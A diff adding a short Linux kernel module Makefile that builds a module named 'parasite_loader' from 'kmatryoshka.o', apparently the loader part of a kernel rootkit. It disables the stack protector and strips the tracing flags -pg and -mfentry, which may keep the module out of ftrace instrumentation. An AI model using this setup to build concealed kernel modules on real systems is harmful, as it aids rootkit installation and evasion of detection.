@@ -1,0 +1,10 @@
+TARGET		?= parasite_loader
+
+obj-m		+= $(TARGET).o
+$(TARGET)-y	+= kmatryoshka.o
+
+ccflags-y	+= $(CFLAGS) -Os \
+		   -fomit-frame-pointer -fno-stack-protector
+
+KBUILD_CFLAGS	:= $(subst -pg,,$(KBUILD_CFLAGS))
+KBUILD_CFLAGS	:= $(subst -mfentry,,$(KBUILD_CFLAGS))
